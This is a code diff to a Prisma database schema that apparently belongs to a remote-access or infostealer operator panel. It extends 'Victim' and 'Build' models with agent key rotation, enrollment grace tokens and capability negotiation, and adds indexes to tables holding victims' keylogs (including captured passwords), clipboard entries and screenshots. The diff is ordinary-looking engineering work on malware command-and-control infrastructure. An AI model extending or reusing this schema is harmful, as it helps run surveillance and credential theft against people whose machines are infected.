@@ -105,10 +105,15 @@ model Build {
   version     String
   profile     Profile     @default(full)
   universal   Boolean     @default(false)
-  buildId     String      @unique @db.Uuid
-  tokenHash   String      @unique
-  secret      String
-  config      Json
+  buildId      String     @unique @db.Uuid
+  tokenHash    String     @unique
+  /// Envelope-sealed build secret. Old rows may still hold legacy plaintext.
+  secret       String
+  /// 1 = HMAC(secret,"enroll") legacy; 2 = HKDF label + per-device key salt.
+  enrollScheme Int        @default(1)
+  config       Json
+  /// Hours an unverified enroll leaves the previous token valid. 0 disables grace.
+  enrollGraceHours Int    @default(24)
   jarPath     String?
   status      BuildStatus @default(draft)
   createdById String?     @db.Uuid
@@ -140,7 +145,26 @@ model Victim {
   status          VictimStatus     @default(online)
   profile         Profile          @default(full)
   agentVersion    String           @default("")
+  /// Negotiated contract (1 while a legacy agent is in use).
+  contractVersion Int              @default(1)
+  /// Intersection of declared agent capabilities and server support.
+  capabilities    String[]         @default([])
+  /// Bumped on capability refresh; the agent re-reads on change.
+  configEpoch     Int              @default(1)
   deviceTokenEnc  String
+  /// 1 = legacy (secret+build+victim); 2 = per-device key salt.
+  keyScheme       Int              @default(1)
+  /// Identity salt generation. Rotating it never changes `keySaltEnc` in place.
+  keyEpoch        Int              @default(1)
+  keySaltEnc      String?
+  /// confirmed | unverified | grace | revoked
+  identityState   String           @default("confirmed")
+  graceUntil      DateTime?
+  /// Rotation and unverified-enroll grace. Both are 24 h maximum.
+  prevTokenEnc        String?
+  prevTokenExpiresAt  DateTime?
+  pendingTokenEnc     String?
+  pendingTokenExpiresAt DateTime?
   firstSeenAt     DateTime         @default(now())
   lastHeartbeatAt DateTime         @default(now())
   /// Liveness from a real agent message; bridge pings never touch it.
@@ -161,12 +185,28 @@ model Victim {
   events          Event[]
   notifications   Notification[]
   wsSeen          WsSeen[]
+  keyEpochs       VictimKeyEpoch[]
   discord         DiscordLink?
 
   @@unique([buildId, hostname, username])
   @@index([status, lastHeartbeatAt])
   @@index([lastAgentMessageAt])
   @@index([os, country])
+}
+
+/// Salt history per device. The active epoch mirrors `Victim.keySaltEnc`; the
+/// last three stay usable so an old outbox/artifact can still close.
+model VictimKeyEpoch {
+  id        String    @id @default(uuid()) @db.Uuid
+  victimId  String    @db.Uuid
+  epoch     Int
+  saltEnc   String
+  createdAt DateTime  @default(now())
+  retiredAt DateTime?
+  victim    Victim    @relation(fields: [victimId], references: [id], onDelete: Cascade)
+
+  @@unique([victimId, epoch])
+  @@index([victimId, epoch])
 }
 
 /// Browser/product session material distinct from console operator sessions.
@@ -288,6 +328,7 @@ model ClipboardEntry {
   victim   Victim   @relation(fields: [victimId], references: [id], onDelete: Cascade)
 
   @@index([victimId, ts])
+  @@index([victimId, kind])
 }
 
 model Keylog {
@@ -304,6 +345,7 @@ model Keylog {
 
   @@index([victimId, ts])
   @@index([victimId, password])
+  @@index([victimId, process, title])
 }
 
 model Screenshot {
